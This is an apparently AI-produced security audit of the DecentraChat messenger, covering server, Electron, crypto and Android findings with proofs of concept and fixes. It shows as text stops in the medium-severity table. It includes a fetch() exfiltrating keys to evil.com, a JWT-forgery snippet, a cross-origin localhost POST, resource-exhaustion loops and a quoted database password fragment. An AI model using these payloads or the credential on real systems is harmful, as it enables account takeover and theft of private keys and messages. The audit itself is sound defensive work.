# 🔒 DecentraChat (Echo) — Unified Security Audit Report

**Date:** 2026-07-10  
**Scope:** Full-stack — Server, Frontend, Cryptography, Key Management, Storage, Electron, Android/Capacitor  
**Auditors:** Antigravity (3-stream parallel audit) · Codex (single-pass review + `npm audit`)

---

## Meta-Comparison

| Dimension | Antigravity | Codex |
|-----------|-------------|-------|
| **Methodology** | 3 parallel subagents (Server, Frontend, Crypto/Storage), taint tracing, PoC for each finding | Single-pass review of all layers, `npm audit` on root + server, test case generation |
| **Raw Finding Count** | 53 (6C / 12H / 15M / 9L) + 19 positive + 4 architectural | 16 (2C / 5H / 5M / 3L) + 10 positive + 3 architectural |
| **Unique Strengths** | Deep crypto/KDF analysis, frontend DOM audit, specific line-level taint traces | Dependency audit (`npm audit`), Android manifest/FileProvider review, PoW replay analysis, test case suggestions, missing-message authorization depth |
| **Blind Spots** | Did not run `npm audit`, did not review Android manifest/FileProvider/Capacitor config in depth | Did not audit individual crypto shim correctness, frontend DOM rendering paths, KDF implementation details, biometric PBKDF2 iteration counts |

### Cross-Reference Map

The table below maps every finding from both audits. **Bold** entries are unique to that auditor.

| Merged ID | Antigravity | Codex | Agreed Severity |
|-----------|-------------|-------|-----------------|
| U-1 | C-1 | — | 🔴 Critical |
| U-2 | C-2 | — | 🔴 Critical |
| U-3 | C-3 | — | 🔴 Critical |
| U-4 | C-4 | Finding 2 | 🔴 Critical |
| U-5 | C-5 + C-6 | Finding 4 | 🔴 Critical |
| U-6 | — | **Finding 1** | 🔴 Critical |
| U-7 | H-12 | Finding 3 | 🟠 High |
| U-8 | — | **Finding 5** | 🟠 High |
| U-9 | L-4 (partial) | **Finding 6** | 🟠 High |
| U-10 | — | **Finding 7** | 🟠 High |
| U-11 | H-1 | — | 🟠 High |
| U-12 | H-2 | Finding 11 (partial) | 🟠 High |
| U-13 | H-3 | — | 🟠 High |
| U-14 | H-4 | Finding 16 | 🟠 High |
| U-15 | H-5 | Finding 13 (partial) | 🟠 High |
| U-16 | H-6 | — | 🟠 High |
| U-17 | H-7 | — | 🟠 High |
| U-18 | H-8 | Finding 14 (partial) | 🟠 High |
| U-19 | H-9 | — | 🟠 High |
| U-20 | H-10 | — | 🟠 High |
| U-21 | H-11 | — | 🟠 High |
| U-22 | (crypto audit) | — | 🟠 High |
| U-23 | — | **Finding 8** | 🟡 Medium |
| U-24 | M-14 | Finding 9 | 🟡 Medium |
| U-25 | — | **Finding 10** | 🟡 Medium |
| U-26 | — | **Finding 12** | 🟡 Medium |
| U-27 | M-1 | Finding 13 (partial) | 🟡 Medium |
| U-28 | M-2 | — | 🟡 Medium |
| U-29 | M-3 | — | 🟡 Medium |
| U-30 | M-4 | Finding 1 (partial) | 🟡 Medium |
| U-31 | M-5 | Finding 14 (partial) | 🟡 Medium |
| U-32 | M-6 | — | 🟡 Medium |
| U-33 | M-7 | — | 🟡 Medium |
| U-34 | M-8 | — | 🟡 Medium |
| U-35 | M-9 | — | 🟡 Medium |
| U-36 | M-10 | — | 🟡 Medium |
| U-37 | M-11 | — | 🟡 Medium |
| U-38 | M-12 | — | 🟡 Medium |
| U-39 | M-13 | — | 🟡 Medium |
| U-40 | M-15 | — | 🟡 Medium |
| U-41 | (crypto audit) | — | 🟡 Medium |
| U-42 | (crypto audit) | — | 🟡 Medium |
| U-43 | (crypto audit) | — | 🟡 Medium |
| U-44 | (crypto audit) | — | 🟡 Medium |
| U-45 | (frontend audit) | — | 🟡 Medium |
| U-46 | (frontend audit) | — | 🟡 Medium |
| U-47 | L-1 | — | 🟢 Low |
| U-48 | L-2 | — | 🟢 Low |
| U-49 | L-3 | — | 🟢 Low |
| U-50 | L-5 | — | 🟢 Low |
| U-51 | L-6 | — | 🟢 Low |
| U-52 | L-7 | — | 🟢 Low |
| U-53 | L-8 | — | 🟢 Low |
| U-54 | L-9 | — | 🟢 Low |
| U-55 | (crypto audit) | — | 🟢 Low |
| U-56 | (crypto audit) | — | 🟢 Low |
| U-57 | (frontend audit) | — | 🟢 Low |
| U-58 | (frontend audit) | — | 🟢 Low |
| U-59 | — | **Finding 15** | 🟢 Low |

**Totals:** 7 Critical · 16 High · 24 Medium · 13 Low = **60 unique findings**

---

## Executive Summary

DecentraChat is a decentralized E2E encrypted messenger with Ethereum wallet authentication, X3DH + Double Ratchet key exchange, and multi-platform support (Web, Electron, Android via Capacitor).

The combined audit identified **60 unique security findings**:

| Severity | Count | Action Required |
|----------|-------|-----------------|
| 🔴 **Critical** | 7 | Immediate — deploy blockers |
| 🟠 **High** | 16 | This week |
| 🟡 **Medium** | 24 | Next sprint |
| 🟢 **Low** | 13 | Backlog |
| ✅ **Positive** | 27 | No action needed |

> [!CAUTION]
> **Both auditors agree: do not ship publicly until Critical and High findings are fixed and retested.** The highest-risk items are hardcoded database credentials (U-1), missing-message authorization bypass allowing exfiltration of private messages (U-6), TEST_MODE authentication bypass (U-2), and Electron `webSecurity: false` (U-4).

---

## 🔴 CRITICAL FINDINGS (7)

---

### U-1 — Hardcoded Production Database Credentials & Weak JWT Secret in Repository

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity C-1 · *Codex did not flag this* |
| **Severity** | 🔴 Critical |
| **File** | [server/.env](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/.env) — Lines 3–4 |
| **Category** | Secrets Management |

**Description:** The `.env` file contains a live Neon database connection string with plaintext credentials (`npg_EqGN3iX5AuJH`) and a trivially guessable JWT secret (`super_secret_jwt_sign_key_change_me_in_production`). The `.env` file is likely committed to version control.

> [!NOTE]
> Codex noted `.env` files are ignored in `.gitignore` as a positive observation. Antigravity found the actual file contents and flagged the weak secret value and the risk of prior commits containing it. **Both perspectives are valid** — the file may currently be gitignored, but the credential values themselves are dangerously weak and should be rotated regardless.

**Taint Trace:**
```
SOURCE: .env file → DATABASE_URL, JWT_SECRET
SINK: db.js pool constructor, auth.js jwt.sign()
```

**Proof of Concept:**
```javascript
// 1. Clone the repository (or access historical commits)
// 2. Read DATABASE_URL → full PostgreSQL access
// 3. Forge any user's JWT:
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { address: "0xVICTIM_ADDRESS" },
  "super_secret_jwt_sign_key_change_me_in_production",
  { expiresIn: '3d' }
);
// 4. Use token → complete account takeover of ANY user
```

**Remediation:**
```bash
# 1. Immediately rotate database password
psql $DATABASE_URL -c "ALTER USER ... PASSWORD '...'"
# 2. Generate cryptographic JWT secret (256+ bits)
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
# 3. Ensure .gitignore covers .env
echo ".env" >> server/.gitignore
# 4. Scrub from git history if ever committed
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch server/.env' HEAD
# 5. Use a secrets manager in production (Vault, AWS SM, etc.)
```

---

### U-2 — `TEST_MODE` Environment Variable Bypasses All Authentication

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity C-2 · *Codex did not flag this* |
| **Severity** | 🔴 Critical |
| **File** | [server.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/server.js) — Lines 240, 246, 418, 424 |
| **Category** | Authentication Bypass |

**Description:** When `TEST_MODE=true`, both puzzle verification AND wallet signature verification are completely bypassed for registration and login. Anyone can register arbitrary wallet addresses and impersonate any user without possessing the private key. There is no safeguard preventing this from being set in production.

**Taint Trace:**
```
SOURCE: process.env.TEST_MODE
SINK: register handler (L240,246), login handler (L418,424)
BYPASS: Both verifyStatelessPuzzle() and verifyWalletSignature() short-circuited
```

**Proof of Concept:**
```javascript
// If TEST_MODE=true (or attacker can influence env vars):
socket.emit('register', {
  address: "0xAnyVictimAddress",
  username: "admin",
  challenge: "x", signature: "x", secretNumber: 1, proofToken: "x"
}, (result) => {
  // result.accessToken = valid JWT for any address — no private key needed
});
```

**Remediation:**
```javascript
// Add startup guard:
if (process.env.NODE_ENV === 'production' && process.env.TEST_MODE === 'true') {
  console.error('FATAL: TEST_MODE enabled in production');
  process.exit(1);
}
// Or remove TEST_MODE from production code entirely
```

---

### U-3 — OPK Exhaustion Attack via Key Bundle Requests

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity C-3 · *Codex did not flag this* |
| **Severity** | 🔴 Critical (Denial of Cryptographic Service) |
| **File** | [server.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/server.js) — Lines 943–1000 |
| **Category** | Protocol-Level DoS |

**Description:** Rate limit for `getKeyBundle` is 5/min per (requester, target) pair. Each request **destructively deletes** an OPK from the database. An attacker opening many sockets can exhaust a victim's entire OPK pool, degrading X3DH to lack forward secrecy for initial messages.

**Proof of Concept:**
```javascript
// 100 sockets × 5 req/min = 500 OPKs consumed per minute
for (let i = 0; i < 100; i++) {
  const socket = io(SERVER, { auth: { token: tokens[i] } });
  socket.emit('getKeyBundle', { address: '0xVICTIM' }, cb);
}
// Victim's entire OPK pool drained → X3DH degrades
```

**Remediation:**
```javascript
// Rate limit per TARGET address globally, not per-requester pair:
const targetBucketKey = `getKeyBundle:target:${targetAddress}`;
if (getGlobalRateCount(targetBucketKey) > 10) {
  return callback({ success: false, error: 'Target rate limit exceeded' });
}
// Add minimum OPK threshold — refuse to serve OPKs when pool < 5
// Notify target user to replenish OPKs when pool is low
```

---

### U-4 — Electron `webSecurity: false` Disables Same-Origin Policy

| Field | Detail |
|-------|--------|
| **Found By** | **Both** — Antigravity C-4 · Codex Finding 2 |
| **Severity** | 🔴 Critical |
| **File** | [electron/main.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/electron/main.js) — Line 159 |
| **Category** | Electron Security |

**Description:** `webSecurity: false` completely disables the Same-Origin Policy and CORS enforcement in the Electron renderer. Any content loaded into the renderer (including via XSS, malicious loaded content, compromised dependency, or unsafe navigation) can make arbitrary cross-origin requests, read responses, and exfiltrate all IndexedDB/localStorage data including private keys, ratchet state, and mnemonics.

**Antigravity's PoC:**
```javascript
// Any injected script gains full cross-origin capability:
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify(await getAllIndexedDBData())
});
// Exfiltrates mnemonics, ratchet keys, message history
```

**Remediation (Codex's hardened version):**
```javascript
webPreferences: {
  nodeIntegration: false,
  contextIsolation: true,
  sandbox: true,        // ← Codex addition
  webSecurity: true,    // ← CRITICAL FIX
  preload: path.join(__dirname, 'preload.js'),
}
```

Additional Codex recommendations:
- Add a strict Content Security Policy
- Avoid loading remote arbitrary content in the renderer
- Use explicit, narrow allowlists for relay URLs and custom protocol resources
- Validate all external URLs before `shell.openExternal`

---

### U-5 — Biometric Key Storage & Authentication Weaknesses (Web + Android)

| Field | Detail |
|-------|--------|
| **Found By** | **Both** — Antigravity C-5 + C-6 · Codex Finding 4 |
| **Severity** | 🔴 Critical |
| **Files** | [secureStorage.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/src/secureStorage.js) L104, L217–220 · [AndroidManifest.xml](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/android/app/src/main/AndroidManifest.xml) |
| **Category** | Key Storage / Mobile Security |

This finding combines three related issues both auditors identified:

**5a — Plaintext biometric key in IndexedDB (Web fallback)** *(Antigravity C-5)*

On web (non-Capacitor), the 256-bit biometric key is stored as plaintext in IndexedDB (`biometric_key`). Any XSS or browser extension can read it and decrypt the mnemonic without any biometric challenge.

```javascript
// No biometrics needed:
const key = await getIDBValue('biometric_key');
const bundle = await getIDBValue('biometric_encrypted_mnemonic');
// Decrypt with key → full mnemonic exposed
```

**5b — Weak Android biometric strength** *(Antigravity C-6)*

`androidBiometryStrength: AndroidBiometryStrength.weak` allows Class 2 sensors that are not certified for crypto operations and can be spoofed (e.g., 2D photo for facial recognition). Combined with `allowDeviceCredential: true`, any device PIN/pattern bypasses biometric protection.

**5c — Not hardware-backed** *(Codex Finding 4)*

The biometric key is stored via Capacitor Preferences (`Preferences.set({ key: 'biometric_key', value: biometricKey })`), not Android Keystore or iOS Keychain. The biometric prompt is just a UI gate — the key itself is not bound to hardware. Additionally, `android:allowBackup="true"` in the manifest means secrets may be extractable via ADB backup.

**Remediation (merged):**
- Store biometric keys in Android Keystore / iOS Keychain via a secure-storage plugin
- Set `androidBiometryStrength: AndroidBiometryStrength.strong` (Class 3)
- Set `android:allowBackup="false"` for release builds, or define backup rules excluding all secret stores
- On web: disable biometric storage entirely, or use WebAuthn PRF extension for hardware-bound key
- Do not store high-value decrypt keys in WebView-accessible storage
- Require password after reinstall, device restore, or biometric enrollment changes

---

### U-6 — Missing-Message Recovery Can Leak Private Messages to Non-Participants

| Field | Detail |
|-------|--------|
| **Found By** | **Codex Finding 1** (Critical) · Antigravity M-4 (Medium — flagged forged `from` but not the full authorization gap) |
| **Severity** | 🔴 Critical |
| **Files** | [server.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/server.js) `requestMissingMessage` / `deliverMissingMessage` · [DecentraChatClient.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/client/src/DecentraChatClient.js) `getMissingMessage` handler |
| **Category** | Authorization / Message Confidentiality |

**Description:** The missing-message recovery flow lets an authenticated socket request a missing message by supplying `conversationId`, `senderAddress`, and `counter`. If the server cannot satisfy the request from `message_backup`, it forwards a `getMissingMessage` event to the claimed sender. The server does not verify that the requester belongs to the requested conversation. The sender client also does not independently verify that `requestedBy` is an authorized participant. This creates a serious confidentiality risk.

> [!CAUTION]
> Antigravity's audit flagged the `deliverMissingMessage` handler for trusting the sender's claim about message content (forged `from` field) but **did not identify the broader authorization bypass** where a non-participant can trigger re-encryption of messages from conversations they don't belong to. Codex correctly elevated this to Critical as it represents a fundamental message confidentiality breach.

**Attack Path (Codex):**
1. Attacker is an authenticated user with any direct session to a victim
2. Attacker guesses or learns a `conversationId`, `senderAddress`, and message counter pattern
3. Attacker emits `requestMissingMessage`
4. Server forwards `getMissingMessage` to the sender
5. Sender client finds a local message and re-encrypts it to the attacker as `requestedBy`

**Impact:**
- Unauthorized disclosure of private message contents
- Group/private conversation boundary bypass
- Possible exfiltration of historical messages from online peers

**Remediation (Codex):**

Server-side:
```javascript
// Verify authorization before forwarding peer recovery requests
// For DMs: socket.address must be one of the two direct-chat participants
// For groups: require signed/current group membership proof or server-visible membership
```

Client-side:
```javascript
const isAuthorized = await this.isRequesterInConversation(conversationId, requestedBy);
if (!isAuthorized) {
  throw new Error("Unauthorized missing-message recovery request.");
}
```

Additional:
- Include request ID and timeout to prevent replay/loop behavior
- Add tests where an authenticated non-member attempts to recover direct and group messages
- For direct conversations, only re-encrypt if `conversationId === requestedBy` or matches expected peer
- For groups, parse local group members and require `requestedBy` to be included

---

## 🟠 HIGH FINDINGS (16)

---

### U-7 — Electron Auth Server: CORS `*` + Predictable Nonce + No Validation

| Field | Detail |
|-------|--------|
| **Found By** | **Both** — Antigravity H-12 · Codex Finding 3 |
| **Severity** | 🟠 High |
| **File** | [electron/main.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/electron/main.js) — Lines 38, 220 |

**Description:** The local auth HTTP server on `127.0.0.1:47823` has three compounding weaknesses:
1. `Access-Control-Allow-Origin: '*'` allows any website to POST (Both)
2. Nonce is `Date.now().toString()` — predictable and not validated on callback (Both)
3. No body size limit on callback (Codex)

**Proof of Concept (Antigravity):**
```javascript
// From any malicious webpage:
fetch('http://127.0.0.1:47823/auth-callback', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({ address: '0xattacker_address' })
});
// Injects attacker-controlled auth data into Electron renderer
```

**Remediation (Codex's detailed fix):**
```javascript
// 1. Generate cryptographically random nonce
const nonce = crypto.randomBytes(32).toString('hex');
pendingAuthNonce = nonce;

// 2. Validate on callback
if (!pendingAuthNonce || data.nonce !== pendingAuthNonce) {
  res.writeHead(403);
  res.end(JSON.stringify({ error: "Invalid auth nonce" }));
  return;
}
pendingAuthNonce = null; // consume nonce

// 3. Expire nonce after short interval (e.g. 60s)
// 4. Restrict CORS origin to auth page
// 5. Limit callback body size
// 6. Validate address/signature payload before forwarding to renderer
```

---

### U-8 — Android Mixed Content & FileProvider Rules Too Broad

| Field | Detail |
|-------|--------|
| **Found By** | **Codex Finding 5 only** |
| **Severity** | 🟠 High |
| **Files** | [capacitor.config.ts](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/capacitor.config.ts) · [file_paths.xml](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/android/app/src/main/res/xml/file_paths.xml) |

**Description:** The Android Capacitor config enables `allowMixedContent: true`, allowing HTTP resources where HTTPS should be enforced. The FileProvider exposes the entire external storage path:
```xml
<external-path name="my_images" path="." />
```

**Impact:**
- Network downgrade/MITM exposure for HTTP resources
- Increased data exposure through broad URI grants
- Larger blast radius if file-sharing code is abused

**Remediation:**
```xml
<!-- Replace broad path with narrow subdirectories -->
<cache-path name="shared_cache" path="shared/" />
<files-path name="shared_files" path="shared/" />
```
- Disable `allowMixedContent` in release builds
- Ensure production relay and media endpoints are HTTPS-only
- Remove `intent://*` unless absolutely required

---

### U-9 — Stateless Proof-of-Work Challenges Are Reusable & Weak

| Field | Detail |
|-------|--------|
| **Found By** | **Codex Finding 6** (deep analysis) + Antigravity L-4 (flagged weak range only) |
| **Severity** | 🟠 High |
| **File** | [auth.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/auth.js) — Line 46 |

**Description:** The PoW challenge has multiple compounding weaknesses:
- Secret number range is only 1–100 — a GPU can pre-compute all 100 Argon2 hashes (Antigravity)
- Token is not bound to address, public key, action type, or expiry (Codex)
- No one-time use enforcement — solved puzzles can be replayed across registration/login (Codex)
- Uses `Math.random()` instead of `crypto.randomInt()` for secret generation (Codex)

**Remediation (Codex):**
- Include `purpose`, `address`, `publicKey`, `issuedAt`, `expiresAt` in the encrypted proof token
- Reject puzzles older than a short TTL (2–5 minutes)
- Store and consume a challenge ID server-side for one-time use, or include a replay cache
- Use `crypto.randomInt(1, 10001)` and increase range to 1–10,000+
- Make difficulty adaptive per abuse source

---

### U-10 — Dependency Vulnerabilities (40 in Root, 16 in Server)

| Field | Detail |
|-------|--------|
| **Found By** | **Codex Findings 7 + 8 only** |
| **Severity** | 🟠 High |

**Root package audit:** 40 vulnerabilities (2 critical, 16 high, 15 moderate, 7 low)

| Package | Severity | Risk |
|---------|----------|------|
| `shell-quote` (via `concurrently`) | Critical | Command injection |
| `vite` | High | Dev server file read |
| `react-router` / `react-router-dom` | High | RCE/XSS/DoS |
| `axios` | High/Moderate | Prototype pollution, credential leak, SSRF |
| `socket.io-parser` / `ws` | High | WebSocket parser DoS |
| `@xmldom/xmldom` | High | XML injection/DoS |
| `protobufjs` | Moderate | Memory amplification |

**Server package audit:** 16 moderate — mostly via `artillery` and OpenTelemetry load-test tooling.

**Remediation:**
- Prioritize runtime dependencies: `socket.io-client`, `react-router-dom`, `protobufjs`, `axios`
- Move load-test tooling to `devDependencies` and use `npm ci --omit=dev` in production
- Exclude dev dependencies from Electron production bundles
- Add CI audit gate for high/critical runtime vulnerabilities
- Re-run `npm audit` after each update cycle

---

### U-11 — CORS Completely Open When NODE_ENV ≠ 'production'

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity H-1 only |
| **Severity** | 🟠 High |
| **File** | [server.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/server.js) — Lines 44–46, 60–62 |

**Description:** CORS allows any origin when `NODE_ENV !== 'production'`. If `.env` is not loaded during deployment, `NODE_ENV` defaults to undefined → wide-open CORS. The `!origin` check also blanket-allows non-browser clients (curl, etc.).

**Remediation:** Invert the logic — only allow specific origins, reject everything else by default. Never use `!origin` as a blanket allow.

---

### U-12 — No Input Length/Type Validation on Cryptographic Material & Batch Uploads

| Field | Detail |
|-------|--------|
| **Found By** | **Both** — Antigravity H-2 · Codex Finding 11 (partial) |
| **Severity** | 🟠 High |
| **File** | [server.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/server.js) — Lines 216–283, 1044–1056 |

**Description (merged):**
- `identityKey`, `signedPreKey`, `preKeySignature`, `publicKey` stored without length limits (Antigravity)
- `uploadOneTimeKeys` has no array size limit — millions of keys in one batch (Both)
- Push tokens have no max length or provider-format validation (Codex)
- `message_backup` has no TTL or per-user storage cap (Codex)
- `x3dhInfo`, `vectorClock`, and group metadata have limited structure validation before JSON storage (Codex)
- One-time key IDs and public keys not strictly type-checked (Codex)

**Proof of Concept (Antigravity):**
```javascript
socket.emit('uploadOneTimeKeys', {
  keys: Array.from({length: 1_000_000}, (_, i) => ({
    keyId: i, publicKey: 'A'.repeat(100_000)
  }))
}, cb);
// Single INSERT with 3M+ parameters → DB OOM
```

**Remediation:** Cap OPK batch to 100 keys. Max 256 chars per crypto field. Validate `keyId` as safe integer, `publicKey` as hex. Cap push token length. Add TTL cleanup for `message_backup`. Validate `vectorClock` member count and integer ranges. Add per-event rate limits for expensive events.

---

### U-13 — Relay Server (GunDB) Has Zero Security Controls

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity H-3 only |
| **Severity** | 🟠 High |
| **File** | [relay-server.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/relay-server.js) — Lines 1–19 |

**Description:** No authentication, no CORS restrictions, no rate limiting, no TLS. Anyone can connect to `http://target:8765/gun` and read/write arbitrary GunDB data.

**Remediation:** Add authentication middleware, CORS restrictions, rate limiting. Deploy behind reverse proxy with TLS.

---

### U-14 — `SERVER_SECRET_KEY` Falls Back to Random Bytes (Non-Persistent)

| Field | Detail |
|-------|--------|
| **Found By** | **Both** — Antigravity H-4 · Codex Finding 16 |
| **Severity** | 🟠 High |
| **File** | [auth.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/auth.js) — Lines 14–16 |

**Description:** If `SERVER_SECRET_KEY` is missing from `.env`, the server generates random bytes on every restart. All previously issued `proofTokens` become invalid. Multi-instance deployments break. This can hide misconfiguration.

**Remediation (Codex):**
- Require `SERVER_SECRET_KEY` in production
- Validate it is exactly 32 bytes of hex
- Allow random fallback only in local development (`NODE_ENV === 'development'`)

---

### U-15 — JWT Access Token Has Excessive 3-Day Lifetime + No Refresh Reuse Detection

| Field | Detail |
|-------|--------|
| **Found By** | **Both** — Antigravity H-5 · Codex Finding 13 (partial) |
| **Severity** | 🟠 High |
| **Files** | [auth.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/auth.js) L140 · [server.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/server.js) `/refresh` endpoint |

**Description (merged):**
- Access tokens expire after 3 days — 72-hour attack window if compromised (Antigravity)
- `/refresh` endpoint has no rate limiting by address/IP (Codex)
- No refresh token reuse detection — reuse of a rotated token is not treated as a compromise signal (Codex)
- No JWT issuer/audience claims (Codex)
- Race conditions can create confusing session behavior (Codex)

**Remediation:**
- Reduce access token to 15–30 minutes; rely on refresh token flow (Antigravity)
- Add IP and address-based rate limits to `/refresh` (Codex)
- Store token family/session ID and revoke the family on reuse (Codex)
- Add device/session metadata (Codex)
- Use explicit JWT `iss`/`aud` claims (Codex)

---

### U-16 — Unsanitized Profile Picture URLs Bypass `sanitizePfpUrl()`

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity H-6 only |
| **Severity** | 🟠 High |
| **File** | [App.jsx](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/src/App.jsx) — Lines 2733, 2766, 3788 |

**Description:** The `sanitizePfpUrl()` function (L666-680) is well-designed (blocks non-HTTPS URLs, limits data URI size to 3MB, caps URL length) but several rendering paths **bypass it entirely** and use raw `member.pfp` directly as `<img src>`.

**Proof of Concept:**
```javascript
// Attacker sets PFP to:
pfp = "https://evil.com/tracking-pixel?victim=TARGET_ADDRESS"
// At L2733: <img src={member.pfp} /> — no sanitization → IP leak
```

**Remediation:** Replace `member.pfp` with `sanitizePfpUrl(member.pfp)` at L2733, L2766, and L3788.

---

### U-17 — CSP Allows `unsafe-eval` and `unsafe-inline`

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity H-7 only |
| **Severity** | 🟠 High |
| **File** | [index.html](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/index.html) — Line 7 |

**Description:** `script-src 'self' 'unsafe-eval' 'unsafe-inline'` defeats the primary purpose of CSP. If any XSS vector is found (even via a browser extension or dependency vulnerability), `unsafe-eval` permits executing arbitrary code via `eval()`, `new Function()`, `setTimeout("string")`, etc.

**Remediation:** Remove `'unsafe-eval'` and `'unsafe-inline'` from the script-src. Use nonce-based or hash-based CSP for legitimate inline scripts. If a bundler requires eval for dev, only enable it in development.

---

### U-18 — Sensitive Cryptographic State Logged to Console in Production

| Field | Detail |
|-------|--------|
| **Found By** | **Both** — Antigravity H-8 (16+ specific locations) · Codex Finding 14 (general) |
| **Severity** | 🟠 High |
| **Files** | [DecentraChatContext.jsx](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/src/DecentraChatContext.jsx) L38, 48, 65, 75, 156, 169, 321, 329, 332, 520, 676, 684, 689, 694, 704, 709 · [server.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/server.js) · [push.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/server/push.js) L53 · [pushManager.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/src/pushManager.js) L25 |

**Description (merged):** Console.log exposes:
- Client wallet addresses (L38, L75) (Antigravity)
- Registration state transitions (L48) (Antigravity)
- Full call stacks with sensitive state (`new Error().stack`, L65) (Antigravity)
- Server URLs and health status (L156, L169) (Antigravity)
- Real-time message payloads from peers (L676) (Antigravity)
- Typing status metadata including sender addresses (L704, L709) (Antigravity)
- Push tokens — partially on server (L922), fully in mock mode (push.js L53), fully on client (pushManager.js L25) (Both)
- Addresses, usernames, message IDs, group IDs, counters (Codex)

Accessible via shared browser sessions, DevTools, console-intercepting extensions/malware, or `adb logcat` on Android.

**Remediation:**
- Gate all console output behind `import.meta.env.DEV` or remove entirely
- Never log push tokens, even partially
- Hash or truncate addresses where logging is necessary
- Use structured log levels and disable verbose client logs in release builds

---

### U-19 — Ratchet Session State & Private Keys Stored Unencrypted in SQLite

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity H-9 only |
| **Severity** | 🟠 High |
| **File** | [dbClient.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/client/src/dbClient.js) — Lines 540–568 |

**Description:** The `ratchet_sessions` table stores `root_key`, `sending_chain_key`, `receiving_chain_key`, `dh_local_private`, and `dh_local_public` as **plaintext TEXT columns**. On the Node.js server-side path (where `DatabaseSync` from `node:sqlite` is used), there is no at-rest encryption. Any file-system access (backup, malware, stolen laptop) exposes all session keys.

> [!NOTE]
> The browser path encrypts via `BrowserMockDatabase` with AES-GCM (using non-extractable CryptoKey), but the Node.js/desktop path has no equivalent protection.

**Remediation:** Use SQLCipher or application-level encryption for SQLite on desktop/server paths.

---

### U-20 — Group Key Has No Rotation (Static Epoch Key)

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity H-10 only |
| **Severity** | 🟠 High |
| **File** | [DecentraChatClient.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/client/src/DecentraChatClient.js) — Lines 1622–1661 |

**Description:** Group encryption uses a single static symmetric key (`group_key`) that is generated at group creation and **never rotated**. When a member is removed, that member retains the group key forever and can decrypt all future messages. There is no post-compromise security for groups.

**Remediation:** Implement epoch-based rekeying. When membership changes, generate a new group key and distribute to remaining members. Consider adopting MLS (Messaging Layer Security) or a Sender Keys variant with periodic rotation.

---

### U-21 — `scryptSync` Shim Silently Substitutes PBKDF2

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity H-11 only |
| **Severity** | 🟠 High |
| **File** | [crypto-shim.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/src/crypto-shim.js) — Lines 157–170, 278–302 |

**Description:** Functions named `scryptSync`/`scryptAsync` actually implement **PBKDF2** via `forge.pkcs5.pbkdf2`. This is a deceptive API surface. Callers believe they have scrypt's memory-hard protection but get PBKDF2 which is GPU/ASIC-friendly — orders of magnitude cheaper to brute-force.

**Remediation:** Either (a) implement actual scrypt via `scrypt-js` or WASM module, (b) rename to `pbkdf2Sync`/`pbkdf2Async` to avoid API confusion, or (c) use Argon2id (already available via `hash-wasm`).

---

### U-22 — Biometric PBKDF2 Uses Only 1,000 Iterations

| Field | Detail |
|-------|--------|
| **Found By** | Antigravity crypto audit only |
| **Severity** | 🟠 High |
| **File** | [secureStorage.js](file:///c:/Users/wfors/Desktop/Scripts/Dicsussion/src/secureStorage.js) — Lines 199, 244 |

**Description:** The biometric key encryption path uses `pbkdf2Sync(biometricKey, salt, 1000, 32, 'sha256')` with only 1,000 iterations. Although the biometric key is random (high entropy), the low iteration count sets a dangerously low bar. If the biometric key leaks (via U-5), the KDF adds negligible protection. More importantly, the `1000` constant could be accidentally copied to password-based paths.

**Remediation:** Since the biometric key is already 256-bit random, PBKDF2 is unnecessary here. Either use the key directly with HKDF (appropriate for high-entropy secrets) or increase iterations to ≥600,000 for defense-in-depth (OWASP recommendation).

---

## 🟡 MEDIUM FINDINGS (24)

| # | Finding | Found By | File(s) | Lines |
|---|---------|----------|---------|-------|
| U-23 | Server package has 16 moderate dev-tool vulnerabilities (artillery/OpenTelemetry) | Codex 8 | server/package.json | — |
| U-24 | Group messages with invalid signatures are stored and displayed with `[UNVERIFIED]` prefix instead of rejected | Both (AG M-14 / Codex 9) | DecentraChatClient.js | L1709–1712 |
| U-25 | Group message username resolution `db.prepare()` called outside database callback scope — runtime crash | Codex 10 | DecentraChatClient.js | — |
| U-26 | Privacy/presence leakage: server returns all online users on login, broadcasts wallet addresses on connect/disconnect, conflicts with stealth/hide-wallet | Codex 12 | server.js | — |
